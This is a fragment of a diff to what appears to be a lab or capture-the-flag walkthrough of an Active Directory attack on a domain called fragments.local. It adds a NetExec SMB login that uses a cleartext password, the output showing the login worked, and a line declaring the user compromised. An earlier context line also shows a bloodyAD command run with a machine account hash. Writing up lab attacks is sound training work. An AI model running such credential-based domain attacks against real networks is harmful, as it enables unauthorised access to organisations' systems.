@@ -585,6 +585,12 @@ bloodyAD --host dc01.fragments.local -d fragments.local -u 'prod$' -p ':b43cb2fc
 Now his logon hours should be modified!
 
 ```python
-
+nxc smb dc01.fragments.local -u d.goggins -p 'HiO5n449W36!' --smb-timeout 5
+SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.29.162     445    DC01             [+] fragments.local\d.goggins:HiO5n449W36!
 ```
+
+Now this user is compromised!
+
+
 
